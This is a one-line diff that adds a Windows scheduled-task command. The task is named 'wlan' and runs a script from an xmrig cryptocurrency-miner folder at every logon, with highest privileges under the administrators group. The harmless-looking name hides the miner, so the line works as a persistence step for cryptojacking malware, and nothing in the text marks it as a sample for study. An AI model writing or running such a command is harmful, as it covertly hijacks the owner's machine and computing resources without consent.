@@ -1,0 +1,1 @@
+schtasks /create /tn "wlan" /tr "'C:\Program Files\xmrig\wlan.cmd'" /sc onlogon /ru administrators /rl HIGHEST
